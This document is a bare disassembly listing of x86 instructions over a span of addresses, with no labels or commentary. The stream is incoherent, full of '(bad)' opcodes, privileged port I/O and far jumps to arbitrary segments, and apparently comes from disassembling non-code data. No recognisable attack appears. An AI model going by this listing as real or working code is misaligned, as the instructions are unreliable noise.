  425591:	cmp    BYTE PTR [ecx+edi*8],ah
  425594:	push   edi
  425595:	push   esp
  425596:	mov    ds:0x6293601c,eax
  42559b:	rcl    esp,1
  42559d:	sar    bh,1
  42559f:	push   0x63f3c6b4
  4255a4:	mov    eax,0x4dec158e
  4255a9:	sbb    esi,DWORD PTR [esi-0x26fac5f4]
  4255af:	in     al,dx
  4255b0:	imul   esi,DWORD PTR [ebx],0x862fba18
  4255b6:	or     al,0xc7
  4255b8:	push   ss
  4255b9:	shl    BYTE PTR [ecx+0x25],0x43
  4255bd:	lahf   
  4255be:	cmp    DWORD PTR [edi+0x1eea1bb6],0xffffff91
  4255c5:	dec    edx
  4255c6:	dec    bp
  4255c8:	repz and esp,DWORD PTR [ebx-0x32]
  4255cc:	pop    ebx
  4255cd:	adc    eax,0x703b0cc
  4255d2:	test   BYTE PTR [edi+0x4f4fa1cb],0xa4
  4255d9:	in     eax,0x66
  4255db:	gs enter 0x8630,0x9f
  4255e0:	outs   dx,DWORD PTR ds:[esi]
  4255e1:	sbb    edi,DWORD PTR [ebx-0x2]
  4255e4:	fisttp DWORD PTR [eax]
  4255e6:	adc    eax,0x34dc2483
  4255eb:	mov    DWORD PTR [ecx-0x73],0x6d717315
  4255f2:	xchg   ecx,eax
  4255f3:	add    ebp,DWORD PTR [ebp+0x5e86e179]
  4255f9:	popf   
  4255fa:	inc    ebp
  4255fb:	and    eax,0x2c3f5891
  425600:	jnp    0x4255ac
  425602:	xor    BYTE PTR [edi+0x6e171477],dh
  425608:	leave  
  425609:	in     eax,0xa
  42560b:	daa    
  42560c:	pop    ebp
  42560d:	lock adc DWORD PTR [esi-0x23],ebx
  425611:	xor    ah,BYTE PTR [eax+0x6a34643a]
  425617:	dec    eax
  425618:	scas   al,BYTE PTR es:[edi]
  425619:	aad    0x5f
  42561b:	das    
  42561c:	pop    esp
  42561d:	xchg   ebp,eax
  42561e:	adc    DWORD PTR [edi],esi
  425620:	pop    eax
  425621:	pop    eax
  425622:	fwait
  425623:	or     dh,BYTE PTR [ecx]
  425625:	mov    esp,0x88df619c
  42562a:	outs   dx,BYTE PTR ds:[esi]
  42562b:	pop    es
  42562c:	and    al,0x5f
  42562e:	sbb    ecx,DWORD PTR [edx]
  425630:	inc    ebx
  425631:	mov    ds:0xd2d1d449,al
  425636:	fild   QWORD PTR [ebp-0x2ff14dcd]
  42563c:	bound  edx,QWORD PTR [esi-0x14]
  42563f:	aaa    
  425640:	sub    al,0x83
  425642:	push   edi
  425643:	jle    0x42563b
  425645:	xchg   esp,eax
  425646:	cdq    
  425647:	adc    al,0xc0
  425649:	sub    edx,ecx
  42564b:	iret   
  42564c:	aas    
  42564d:	outs   dx,BYTE PTR ds:[esi]
  42564e:	std    
  42564f:	mov    DWORD PTR [edx+0x1],esp
  425652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425653:	dec    edx
  425654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425655:	test   DWORD PTR [eax-0x3050736a],0x42238afc
  42565f:	clc    
  425660:	arpl   WORD PTR [ebx-0x41],di
  425663:	mov    dl,0x54
  425665:	(bad)  
  425666:	push   esp
  425667:	cmp    eax,0xb90776a2
  42566c:	xor    eax,0x7f6a1b34
  425671:	(bad)  
  425672:	call   0x4a4a35ca
  425677:	mov    BYTE PTR [edi+0x73],dl
  42567a:	xor    dh,BYTE PTR [ecx+eiz*4-0x46492fb9]
  425681:	jb     0x425611
  425683:	addr16 cwde 
  425685:	loope  0x42567d
  425687:	shr    BYTE PTR [esi+0x3b],1
  42568a:	jg     0x425688
  42568c:	in     al,dx
  42568d:	in     eax,0x8b
  42568f:	ja     0x425703
  425691:	imul   edi,edx,0x164c3ad0
  425697:	mov    bl,0xcc
  425699:	pop    edi
  42569a:	push   ds
  42569b:	std    
  42569c:	mov    DWORD PTR [eax+0x45],esp
  42569f:	sahf   
  4256a0:	mov    al,ds:0x7107ff88
  4256a5:	sti    
  4256a6:	(bad)  [ebp-0x222b8fe2]
  4256ac:	jmp    0x425671
  4256ae:	gs popf 
  4256b0:	sub    bl,dl
  4256b2:	fwait
  4256b3:	outs   dx,DWORD PTR ds:[esi]
  4256b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256b5:	mov    ds:0xe3a6e74e,eax
  4256ba:	std    
  4256bb:	xchg   esp,eax
  4256bc:	xor    ah,BYTE PTR [eax]
  4256be:	aad    0x4d
  4256c0:	push   esp
  4256c1:	jle    0x425725
  4256c3:	mov    ebx,0x336f18f3
  4256c8:	xlat   BYTE PTR ds:[ebx]
  4256c9:	hlt    
  4256ca:	jns    0x425737
  4256cc:	xor    edx,DWORD PTR [ebx-0x27]
  4256cf:	push   ds
  4256d0:	push   edx
  4256d1:	rol    DWORD PTR [edx+0x7bc365e0],0xbe
  4256d8:	add    ebx,ebx
  4256da:	ret    
  4256db:	push   ss
  4256dc:	xchg   esi,eax
  4256dd:	das    
  4256de:	mul    BYTE PTR [esi]
  4256e0:	jge    0x425753
  4256e2:	mov    bl,0xd
  4256e4:	je     0x425724
  4256e6:	sub    al,0x45
  4256e8:	xchg   esp,eax
  4256e9:	sub    ebp,eax
  4256eb:	es hlt 
  4256ed:	(bad)  
  4256ee:	mov    al,0xa6
  4256f0:	daa    
  4256f1:	dec    ebx
  4256f2:	cmp    al,0xb5
  4256f5:	jo     0x425696
  4256f7:	push   edx
  4256f8:	arpl   WORD PTR [edx-0x35ab64ff],cx
  4256fe:	retf   
  4256ff:	ins    BYTE PTR es:[edi],dx
  425700:	dec    eax
  425701:	xlat   BYTE PTR ds:[ebx]
  425702:	nop
  425703:	and    bl,BYTE PTR [ecx+0x16f27a31]
  425709:	enter  0xa1cf,0x0
  42570d:	push   0xe12fd6d5
  425712:	addr16 mov ds:0x8283,al
  425716:	mov    esi,0x1fc0124c
  42571b:	mov    BYTE PTR [ecx-0x60],bl
  42571e:	mov    eax,0xa49be183
  425723:	dec    esp
  425724:	mov    ecx,0xba013175
  425729:	in     eax,dx
  42572a:	mov    al,ds:0x25cf5086
  42572f:	mul    BYTE PTR [esi+edx*2-0x4c797222]
  425736:	out    dx,al
  425737:	loope  0x425748
  425739:	inc    esp
  42573a:	xchg   esp,eax
  42573b:	xor    al,0x52
  42573d:	cs test eax,0xc97c5702
  425743:	sbb    dh,al
  425745:	add    ch,BYTE PTR [ebx+0x51]
  425748:	int3   
  425749:	fcmove st,st(7)
  42574b:	popa   
  42574c:	sti    
  42574d:	and    DWORD PTR [ecx],ecx
  42574f:	xchg   edi,eax
  425750:	or     BYTE PTR gs:[ebp+0x5ad1f2bb],0x4c
  425758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425759:	pop    ds
  42575a:	or     al,0x37
  42575c:	sub    ecx,esi
  42575e:	mov    ch,0x58
  425760:	int3   
  425761:	pop    edi
  425762:	cli    
  425763:	shl    BYTE PTR [edi+0x5cdc6bd],cl
  425769:	push   ecx
  42576a:	test   DWORD PTR [edx-0x2c],edx
  42576d:	int3   
  42576e:	nop
  42576f:	xchg   esp,eax
  425770:	int    0x34
  425772:	sub    BYTE PTR [ecx],dh
  425774:	cli    
  425775:	or     esp,esp
  425777:	iret   
  425778:	gs lahf 
  42577a:	pop    edi
  42577b:	aas    
  42577c:	inc    eax
  42577d:	popf   
  42577e:	jge    0x425733
  425780:	inc    esi
  425781:	icebp  
  425782:	and    edx,DWORD PTR ds:0xc1b3b097
  425788:	sbb    DWORD PTR [edi-0x18da4731],ecx
  42578e:	mov    dl,0x7c
  425790:	lods   ax,WORD PTR ds:[esi]
  425792:	cli    
  425793:	xchg   esi,eax
  425794:	shr    esi,cl
  425796:	push   esp
  425797:	push   ds
  425798:	cmp    eax,0xbc06ffcb
  42579d:	mov    ch,0x7a
  42579f:	mov    ecx,0x8aea6b7
  4257a4:	sub    bh,BYTE PTR [ecx]
  4257a6:	fcomi  st,st(7)
  4257a8:	cmp    DWORD PTR [ebx],0x24
  4257ab:	repz adc DWORD PTR [ebp+0x646be9bf],ebx
  4257b2:	mov    dl,0xd8
  4257b4:	and    edx,eax
  4257b6:	test   al,0x27
  4257b8:	mov    cl,0xea
  4257ba:	inc    esp
  4257bb:	add    bl,bl
  4257bd:	js     0x4257ed
  4257bf:	mov    bh,0x52
  4257c1:	sub    ebp,DWORD PTR [ecx-0x209d7b82]
  4257c7:	bound  ebp,QWORD PTR [ecx+0x24]
  4257ca:	inc    ecx
  4257cb:	(bad)  
  4257cc:	pushf  
  4257cd:	adc    ch,BYTE PTR [ebx-0xa]
  4257d0:	scas   eax,DWORD PTR es:[edi]
  4257d1:	xchg   ecx,eax
  4257d2:	icebp  
  4257d3:	imul   BYTE PTR [edx]
  4257d5:	mov    bl,0x8c
  4257d7:	mov    edx,0xfd9ff047
  4257dc:	retf   
  4257dd:	aaa    
  4257de:	loop   0x425842
  4257e0:	lock imul ebx,ebp,0x7a053b19
  4257e7:	cdq    
  4257e8:	and    ah,BYTE PTR [ebx]
  4257ea:	xchg   ebx,eax
  4257eb:	pushf  
  4257ec:	push   eax
  4257ed:	and    ch,bl
  4257ef:	xor    al,0x64
  4257f1:	repz xor ebx,DWORD PTR [ecx+0x58]
  4257f5:	call   0x6a0a:0x77fabb20
  4257fc:	leave  
  4257fd:	pop    esi
  4257fe:	enter  0x45cc,0xbb
  425802:	ret    
  425803:	push   edx
  425804:	das    
  425805:	int3   
  425806:	and    dl,bh
  425808:	sub    eax,0x5342010d
  42580d:	stos   BYTE PTR es:[edi],al
  42580e:	aas    
  42580f:	mov    edi,DWORD PTR ds:0x8457ceb9
  425815:	popf   
  425816:	popfw  
  425818:	dec    ecx
  425819:	cmp    DWORD PTR [ebx-0x5a],esp
  42581c:	mov    cs,edi
  42581e:	popf   
  42581f:	sbb    BYTE PTR [edi-0x57bd541d],al
  425825:	aam    0xc
  425827:	cmp    eax,0x34169df8
  42582c:	add    esi,DWORD PTR [ebx]
  42582e:	hlt    
  42582f:	add    eax,0x1aba54a9
  425834:	mov    ebx,0x7e8613d5
  425839:	add    BYTE PTR [ebx],al
  42583b:	lahf   
  42583c:	gs mov al,0xdd
  42583f:	icebp  
  425840:	add    BYTE PTR [eax],cl
  425842:	push   esi
  425843:	mov    ch,0x31
  425845:	int    0x7d
  425847:	(bad)  
  425848:	mov    fs,WORD PTR [esi+0x4d00a05f]
  42584e:	mov    ds:0xe87c03c1,al
  425853:	std    
  425854:	dec    ebx
  425855:	pshufw mm7,mm4,0xda
  425859:	mov    ds:0xc54e7d,al
  42585e:	add    BYTE PTR [eax],al
  425860:	add    BYTE PTR [eax],al
  425862:	add    eax,0xaf44af85
  425867:	outs   dx,BYTE PTR ds:[esi]
  425868:	out    dx,eax
  425869:	lds    ecx,FWORD PTR [ecx-0x69a2c908]
  42586f:	xchg   DWORD PTR ds:0x1d0e252,ecx
  425875:	add    bl,dh
  425877:	add    al,0x0
  425879:	add    bh,dl
  42587b:	mov    esi,0x77186004
  425880:	popf   
  425881:	and    BYTE PTR [edx+0x1289c843],cl
  425887:	clc    
  425888:	xchg   edx,eax
  425889:	and    ebx,DWORD PTR [ecx+0x141b86fc]
  42588f:	sti    
  425890:	push   0x3d
  425892:	mov    esp,0xdc0f22ce
  425897:	in     al,dx
  425898:	dec    ebp
  425899:	jne    0x42586a
  42589b:	push   ds
  42589c:	dec    ebx
  42589d:	push   0x9b14394b
  4258a2:	jle    0x4258bb
  4258a4:	and    al,0x3c
  4258a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258a7:	(bad)
  4258aa:	inc    esi
  4258ab:	add    dh,al
  4258ad:	xchg   edx,eax
  4258ae:	mov    eax,0xe3b590f
  4258b3:	lods   al,BYTE PTR ds:[esi]
  4258b4:	in     eax,0x8
  4258b6:	or     al,0xba
  4258b8:	push   eax
  4258b9:	cmp    eax,0xf6d91318
  4258be:	pop    ebp
  4258bf:	sbb    al,0xca
  4258c1:	dec    edi
  4258c2:	and    ebx,0xffffff81
  4258c5:	fistp  WORD PTR [eax+0x78]
  4258c8:	sbb    eax,0x64bb3ad1
  4258cd:	xor    BYTE PTR [edi-0x3],dh
  4258d0:	pusha  
  4258d1:	(bad)  
  4258d2:	sub    BYTE PTR [ebx+0x19],bh
  4258d5:	dec    edi
  4258d6:	sbb    edx,edx
  4258d8:	add    DWORD PTR fs:[ebp-0x326cfbc8],0xffffff83
  4258e0:	xor    eax,DWORD PTR [ecx-0x4c483838]
  4258e6:	jb     0x42595f
  4258e8:	sub    eax,0x3e5d50e3
  4258ed:	jp     0x425917
  4258ef:	push   es
  4258f0:	inc    esi
  4258f1:	sub    DWORD PTR [ecx-0x55],0xd6582970
  4258f8:	xchg   ecx,esp
  4258fa:	xor    dl,BYTE PTR [esi-0x65]
  4258fd:	rol    DWORD PTR [esi],cl
  4258ff:	hlt    
  425900:	cmp    al,0x96
  425902:	add    BYTE PTR [edx+edx*4-0x4a21d310],dl
  425909:	dec    edi
  42590a:	or     ch,BYTE PTR [edx+0x62]
  42590d:	in     eax,dx
  42590e:	stc    
  42590f:	xchg   esi,eax
  425910:	aad    0x78
  425912:	sub    BYTE PTR [eax+0x292c93cf],bh
  425918:	into   
  425919:	jg     0x4258e9
  42591b:	stos   DWORD PTR es:[edi],eax
  42591c:	scas   eax,DWORD PTR es:[edi]
  42591d:	sbb    BYTE PTR [ebp+0x726bd7fd],ah
  425923:	sbb    edx,esp
  425925:	and    bl,BYTE PTR [ebx-0x38722769]
  42592b:	ja     0x425996
  42592d:	inc    edi
  42592e:	into   
  42592f:	int3   
  425930:	sbb    DWORD PTR [esi-0xdeffc5a],0x5650998b
  42593a:	push   ecx
  42593b:	mov    ecx,0x76b81bb5
  425940:	xchg   ebp,eax
  425941:	ret    0x5909
  425944:	fldenv [esp+esi*8+0x41001210]
  42594b:	push   edx
  42594c:	push   esp
  42594d:	fimul  DWORD PTR ds:0x502da8bc
  425953:	sahf   
  425954:	xor    al,0x98
  425956:	sti    
  425957:	mov    bl,0x89
  425959:	(bad)  
  42595a:	jne    0x42598e
  42595c:	mov    ch,0xc
  42595e:	lds    eax,FWORD PTR [esi]
  425960:	mov    al,ds:0xd73cabb6
  425965:	or     DWORD PTR [edi+0x262f2484],edx
  42596b:	mov    bh,BYTE PTR ds:0xbcb70d3e
  425971:	xor    eax,0x13bb9ea1
  425976:	pop    edx
  425977:	repz into 
  425979:	push   esi
  42597a:	sub    al,0x70
  42597c:	mov    DWORD PTR [ecx+0x21],ecx
  42597f:	out    0x84,al
  425981:	stc    
  425982:	gs arpl ax,dx
  425985:	rol    BYTE PTR ds:0xb24eb94c,0x99
  42598c:	dec    esi
  42598d:	std    
  42598e:	xchg   DWORD PTR [ebx-0x4f5266b3],ebp
  425994:	mov    BYTE PTR [esi+0x2e],dl
  425997:	sbb    edi,DWORD PTR [ebx]
  425999:	mov    bh,0x8d
  42599b:	pop    ds
  42599c:	mov    edi,0x76d26e2e
  4259a1:	cmp    DWORD PTR [esi+0x3965c91],0x284d762a
  4259ab:	xchg   edx,eax
  4259ac:	ror    BYTE PTR [esi-0x39a0030d],cl
  4259b2:	mov    esp,0x5e02cae2
  4259b7:	fdiv   DWORD PTR [edi-0x25]
  4259ba:	jecxz  0x4259b7
  4259bc:	mov    BYTE PTR [ebp+0x1c],bl
  4259bf:	arpl   ax,bp
  4259c1:	jo     0x4259ec
  4259c3:	dec    eax
  4259c4:	call   0x955357a8
  4259c9:	ins    BYTE PTR es:[edi],dx
  4259ca:	cmc    
  4259cb:	mul    BYTE PTR [eax]
  4259cd:	aaa    
  4259ce:	push   cs
  4259cf:	or     BYTE PTR [ebp-0x291ce6cb],ah
  4259d5:	jo     0x425a2f
  4259d7:	lahf   
  4259d8:	lds    ebx,FWORD PTR [ebx+0x21755e1f]
  4259de:	retf   
  4259df:	inc    esi
  4259e0:	cmp    DWORD PTR ds:0x45d5f943,ecx
  4259e6:	mov    ecx,esi
  4259e8:	mov    al,ds:0xdc7261c4
  4259ed:	test   DWORD PTR [ebp+0x53],eax
  4259f0:	jb     0x425a5d
  4259f2:	fs adc cl,cl
  4259f5:	jge    0x4259c6
  4259f7:	rcl    DWORD PTR [edx],0xee
  4259fa:	stos   WORD PTR es:[edi],ax
  4259fc:	dec    ecx
  4259fd:	sub    eax,0xf1ad870
  425a02:	cmp    ecx,ecx
  425a04:	sahf   
  425a05:	icebp  
  425a06:	ds mov dh,0xa3
  425a09:	or     eax,0x6feb38c8
  425a0e:	iret   
  425a0f:	push   cs
  425a10:	xchg   ebx,eax
  425a11:	xor    eax,0xacb38255
  425a16:	inc    eax
  425a17:	mov    ecx,0x9985594f
  425a1c:	inc    eax
  425a1d:	jne    0x425a3a
  425a1f:	dec    ebp
  425a20:	xchg   edx,eax
  425a21:	push   ss
  425a22:	or     dl,bh
  425a24:	and    edi,ebx
  425a26:	adc    ebx,0x69
  425a29:	test   al,0xd1
  425a2b:	sbb    dl,BYTE PTR [edi+0x7d]
  425a2e:	add    bl,BYTE PTR [edi+edx*2]
  425a31:	ins    DWORD PTR es:[edi],dx
  425a32:	rcr    BYTE PTR [ecx+0x575637be],0x20
  425a39:	pusha  
  425a3a:	scas   al,BYTE PTR es:[edi]
  425a3b:	pop    ecx
  425a3c:	or     edx,DWORD PTR [ebx+0x43f8343f]
  425a42:	xchg   ebp,eax
  425a43:	cmc    
  425a44:	mov    ebp,0x84fa521a
  425a49:	cmc    
  425a4a:	pop    esi
  425a4b:	ss inc ecx
  425a4d:	shr    DWORD PTR [edx+0x9033ca],cl
  425a53:	inc    ebx
  425a54:	xlat   BYTE PTR ds:[ebx]
  425a55:	mov    ebp,DWORD PTR [edx-0x4cca17db]
  425a5b:	inc    eax
  425a5c:	cmp    DWORD PTR [eax-0x4434d0d9],eax
  425a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a63:	mov    bl,0xd6
  425a65:	pop    ds
  425a66:	push   esi
  425a67:	sar    BYTE PTR [ecx-0x21339aa7],cl
  425a6d:	jb     0x425aab
  425a6f:	push   ebx
  425a70:	xor    DWORD PTR [ecx],esp
  425a72:	xor    dl,bh
  425a74:	popf   
  425a75:	in     al,0x9a
  425a77:	jp     0x425a93
  425a79:	inc    edi
  425a7a:	adc    eax,0xcedb0345
  425a7f:	sub    DWORD PTR [ebx],edx
  425a81:	cmp    DWORD PTR [ecx],edi
  425a83:	jmp    0x425aef
  425a85:	inc    ecx
  425a86:	rcl    dh,1
  425a88:	xor    al,bh
  425a8a:	mov    eax,ds:0xa954ed2f
  425a8f:	std    
  425a90:	sub    BYTE PTR [edx+0x4d],bh
  425a93:	sbb    al,0x81
  425a95:	ins    DWORD PTR es:[edi],dx
  425a96:	je     0x425a94
  425a98:	test   BYTE PTR [esi+edi*4+0x7e],dh
  425a9c:	sbb    cl,bl
  425a9e:	lea    esi,[ebp+ebp*2+0x59]
  425aa2:	jnp    0x425aea
  425aa4:	jns    0x425aa8
  425aa6:	stos   DWORD PTR es:[edi],eax
  425aa7:	jmp    0x7513:0xef00aa7d
  425aae:	lods   eax,DWORD PTR ds:[esi]
  425aaf:	dec    ecx
  425ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ab1:	lea    ebx,[ebp-0x68d79020]
  425ab7:	jle    0x425aa7
  425ab9:	mov    ch,0xde
  425abb:	jge    0x425b02
  425abd:	mov    dl,0x28
  425abf:	sbb    al,0x37
  425ac1:	test   eax,0xea02969c
  425ac6:	pop    eax
  425ac7:	sub    al,0xa9
  425ac9:	sbb    bl,al
  425acb:	and    ebx,esi
  425acd:	dec    esp
  425ace:	outs   dx,BYTE PTR ds:[esi]
  425acf:	sub    al,0x5c
  425ad1:	(bad)  
  425ad2:	jp     0x425afe
  425ad4:	mov    eax,ds:0x4310629e
  425ad9:	imul   eax,DWORD PTR [ebx-0x4bad4f1c],0xf02b7792
  425ae3:	xor    ebp,DWORD PTR [ebx+0x20]
  425ae6:	inc    DWORD PTR [edi+0x30c776e8]
  425aec:	pop    esi
  425aed:	gs or  al,0xa6
  425af0:	and    al,0xc1
  425af2:	out    0x12,al
  425af4:	push   esp
  425af5:	addr16 sbb al,0x1c
  425af8:	push   es
  425af9:	push   esp
  425afa:	xor    BYTE PTR [ebx],ah
  425afc:	xor    al,0x1d
  425afe:	enter  0x942,0x79
  425b02:	inc    edx
  425b03:	popa   
  425b04:	call   0x93d0:0xf9dac7e8
  425b0b:	iret   
  425b0c:	rcl    BYTE PTR [edx-0x37],1
  425b0f:	ret    
  425b10:	xchg   ebp,eax
  425b11:	test   eax,0x7f04c7e8
  425b16:	jbe    0x425b44
  425b18:	sub    BYTE PTR ds:0x34d5213f,0x73
  425b1f:	retf   
  425b20:	dec    ebp
  425b21:	sub    BYTE PTR [eax-0x29],dl
  425b24:	iret   
  425b25:	push   0xffffffe1
  425b27:	outs   dx,BYTE PTR ds:[esi]
  425b28:	dec    esi
  425b29:	xor    edi,0x45
  425b2c:	sbb    bh,BYTE PTR [edx+ecx*4-0x165ed713]
  425b33:	frstor [esi]
  425b35:	sub    esi,DWORD PTR [ecx-0x4e]
  425b38:	sub    BYTE PTR [eax],al
  425b3a:	adc    DWORD PTR [ecx+0x22c24897],ebp
  425b40:	fld    QWORD PTR [esi-0x57]
  425b43:	xchg   ebx,eax
  425b44:	out    dx,eax
  425b45:	clc    
  425b46:	leave  
  425b47:	cli    
  425b48:	dec    eax
  425b49:	xor    eax,DWORD PTR [ebp+0x3d4fad3]
  425b4f:	cli    
  425b50:	in     eax,dx
  425b51:	xchg   edi,eax
  425b52:	lahf   
  425b53:	test   BYTE PTR [edi],ah
  425b55:	xchg   ebx,eax
  425b56:	xor    DWORD PTR [edx-0x56],ebp
  425b59:	es xor eax,0x563d7c
  425b5f:	add    eax,0x46b22978
  425b64:	push   ds
  425b65:	sti    
  425b66:	cwd    
  425b68:	lods   al,BYTE PTR ds:[esi]
  425b69:	ds int 0xf3
  425b6c:	xor    al,0x8e
  425b6e:	xor    eax,0x5c
  425b71:	jb     0x425ba2
  425b73:	rcl    DWORD PTR [eax-0x3c],0x68
  425b77:	pop    esp
  425b78:	dec    esp
  425b79:	push   ebx
  425b7a:	retf   0xa897
  425b7d:	loopne 0x425b19
  425b7f:	adc    esp,DWORD PTR [eax-0x491aa4e2]
  425b85:	hlt    
  425b86:	inc    esp
  425b87:	outs   dx,BYTE PTR ds:[esi]
  425b88:	push   es
  425b89:	or     eax,0x7a8d7b43
  425b8e:	adc    eax,0xa534f94d
  425b93:	and    al,0x60
  425b95:	retf   
  425b96:	adc    al,0x80
  425b98:	ds test eax,0xa51b172d
  425b9e:	pop    es
  425b9f:	mov    DWORD PTR [bx+0x27],esp
  425ba3:	lock test edi,ebp
  425ba6:	loope  0x425b63
  425ba8:	test   al,0x14
  425baa:	mov    eax,0xff2ac96
  425baf:	int3   
  425bb0:	mov    eax,0x8ebcd224
  425bb5:	(bad)  
  425bb6:	sbb    BYTE PTR [esi-0x1c],dl
  425bb9:	push   ds
  425bba:	in     al,0x19
  425bbc:	pop    ss
  425bbd:	pop    ds
  425bbe:	aaa    
  425bbf:	push   edx
  425bc0:	ret    
  425bc1:	dec    edi
  425bc2:	xor    ebp,ebx
  425bc4:	and    ch,ch
  425bc6:	inc    esi
  425bc7:	lods   al,BYTE PTR ds:[esi]
  425bc8:	sbb    DWORD PTR [esi-0x59399918],esi
  425bce:	out    0x41,eax
  425bd0:	nop
  425bd1:	sbb    DWORD PTR [ecx+ebp*8+0x126a35f5],edx
  425bd8:	xchg   edx,eax
  425bd9:	xlat   BYTE PTR ds:[ebx]
  425bda:	jo     0x425bba
  425bdc:	sahf   
  425bdd:	das    
  425bde:	pop    ebx
  425bdf:	test   DWORD PTR [esi],edx
  425be1:	xchg   ebp,esi
  425be3:	sbb    BYTE PTR [esi],ch
  425be5:	mov    WORD PTR [eax+0x2a],cs
  425be8:	nop
  425be9:	xchg   ecx,eax
  425bea:	cdq    
  425beb:	or     edi,DWORD PTR [ecx-0x27]
  425bee:	out    0x36,eax
  425bf0:	cld    
  425bf1:	push   ecx
  425bf2:	push   esp
  425bf3:	or     eax,0xe092700a
  425bf8:	data16 das 
  425bfa:	xchg   esp,eax
  425bfb:	and    dh,cl
  425bfd:	fist   WORD PTR [esi-0x39]
  425c00:	hlt    
  425c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c02:	inc    eax
  425c03:	push   ds
  425c04:	test   BYTE PTR [esi+0x101d010],dl
  425c0a:	lahf   
  425c0b:	adc    al,0x6b
  425c0d:	or     eax,0x3c457b50
  425c12:	in     eax,0xf2
  425c14:	adc    al,0x70
  425c16:	pop    ss
  425c17:	cmc    
  425c18:	pop    esi
  425c19:	popf   
  425c1a:	sub    dl,dh
  425c1c:	add    BYTE PTR [edi],0x2c
  425c1f:	mov    eax,ds:0x903d047
  425c24:	js     0x425c23
  425c26:	std    
  425c27:	pop    ss
  425c28:	mov    ds:0xad3dd3c7,eax
  425c2d:	jmp    edi
  425c2f:	push   ss
  425c30:	out    dx,al
  425c31:	and    al,0x4a
  425c33:	push   0xf09a9e5f
  425c38:	sbb    DWORD PTR [edi-0x1],eax
  425c3b:	pop    ss
  425c3c:	sbb    esp,ecx
  425c3e:	xchg   DWORD PTR [esi-0x7f],eax
  425c41:	ror    DWORD PTR [edi+0x15c35ff5],cl
  425c47:	stc    
  425c48:	cmp    cl,0x79
  425c4b:	gs xchg ebx,eax
  425c4d:	push   edx
  425c4e:	mov    ch,0x9f
  425c50:	jg     0x425c5d
  425c52:	xor    DWORD PTR [edi+0x1047b68e],0xffffff8b
  425c59:	cld    
  425c5a:	dec    ebx
  425c5b:	fistp  QWORD PTR [ecx+0x69e80b06]
  425c61:	jecxz  0x425c6c
  425c63:	mov    al,0x81
  425c65:	sti    
  425c66:	jo     0x425cde
  425c68:	ins    DWORD PTR es:[edi],dx
  425c69:	ds sbb al,0x9c
  425c6c:	retf   
  425c6d:	or     bl,bh
  425c6f:	fsubr  DWORD PTR [esi+eax*8-0x27]
  425c73:	psrlq  mm4,QWORD PTR [ecx]
  425c76:	test   bl,bh
  425c78:	dec    ecx
  425c79:	mov    esp,0x957aa0e8
  425c7e:	aas    
  425c7f:	xchg   edx,eax
  425c80:	mov    ch,0xe3
  425c82:	adc    ecx,DWORD PTR [edi]
  425c84:	cmp    ch,BYTE PTR [ecx+0x33]
  425c87:	sahf   
  425c88:	retf   
  425c89:	pop    ebx
  425c8a:	test   al,0x55
  425c8c:	xor    DWORD PTR [esi-0x29],edx
  425c8f:	lock jmp 0x95f0c54d
  425c95:	out    dx,al
  425c96:	icebp  
  425c97:	push   cs
  425c98:	test   al,0x70
  425c9a:	dec    eax
  425c9b:	dec    cx
  425c9d:	pop    ds
  425c9e:	jge    0x425c82
  425ca0:	je     0x425c52
  425ca2:	repz or BYTE PTR [ebx],dl
  425ca5:	jle    0x425c4b
  425ca7:	sbb    dl,dl
  425ca9:	xchg   ebp,eax
  425caa:	(bad)  
  425cab:	cmp    BYTE PTR [ecx],bl
  425cad:	in     eax,0x6b
  425caf:	out    dx,eax
  425cb0:	pop    edi
  425cb1:	not    DWORD PTR ds:0x69aa9098
  425cb7:	and    BYTE PTR [edi+0x116197b7],ah
  425cbd:	pop    ebp
  425cbe:	aad    0xe8
  425cc0:	push   cs
  425cc1:	sub    al,0xc8
  425cc3:	pop    ebx
  425cc4:	fstp   DWORD PTR [ebx]
  425cc6:	or     eax,0x113afeb2
  425ccb:	aam    0xcc
  425ccd:	sub    edx,edx
  425ccf:	xor    ecx,DWORD PTR [ebx+eax*1-0x75eeb121]
  425cd6:	xor    dl,BYTE PTR [ecx-0x14]
  425cd9:	jmp    0x1fc7:0xd30ecb68
  425ce0:	stc    
  425ce1:	(bad)  
  425ce2:	gs mov edx,0x1ae02ffc
  425ce8:	push   ds
  425ce9:	push   es
  425cea:	test   BYTE PTR [ebp-0x46],bl
  425ced:	ins    DWORD PTR es:[edi],dx
  425cee:	ror    ch,0x50
  425cf1:	rcr    BYTE PTR [ecx],0x94
  425cf4:	mov    ds:0x62229ed1,al
  425cf9:	int    0x8a
  425cfb:	addr16 xchg ebx,eax
  425cfd:	imul   edi,DWORD PTR [esi-0x115312c9],0x19
  425d04:	shl    DWORD PTR [esp+ebp*1+0x6b],cl
  425d08:	(bad)  
  425d09:	mov    ds:0xc53e945d,eax
  425d0e:	lods   al,BYTE PTR ds:[esi]
  425d0f:	add    eax,0x7e8d40cd
  425d14:	jg     0x425cef
  425d16:	in     al,dx
  425d17:	ret    0x3431
  425d1a:	sub    eax,0xca841dea
  425d1f:	lods   al,BYTE PTR ds:[esi]
  425d20:	push   ebp
  425d21:	(bad)  
  425d22:	nop
  425d23:	add    eax,0x885069d2
  425d28:	retf   0xd9f4
  425d2b:	fstp   QWORD PTR ds:0xf7030a38
  425d31:	add    eax,0x89ff197c
  425d36:	mov    gs,WORD PTR [ecx+ebp*2+0x74eaec8f]
  425d3d:	xor    eax,0x22df55f1
  425d42:	gs inc ecx
  425d44:	adc    eax,0x27ca5aa4
  425d49:	jae    0x425d55
  425d4b:	lods   eax,DWORD PTR ds:[esi]
  425d4c:	xchg   ebp,eax
  425d4d:	mov    ch,0x7f
  425d4f:	jno    0x425d17
  425d51:	test   BYTE PTR [esi-0x2f],bh
  425d54:	sbb    eax,DWORD PTR [ebx+0x77]
  425d57:	out    dx,al
  425d58:	xchg   esp,eax
  425d59:	mov    DWORD PTR [edx+0x46d562e2],edx
  425d5f:	fs push 0x7c266086
  425d65:	pushf  
  425d66:	sub    eax,0xdcbc1557
  425d6b:	sbb    DWORD PTR [bx+si],eax
  425d6e:	add    BYTE PTR [eax],al
  425d70:	add    BYTE PTR [eax],al
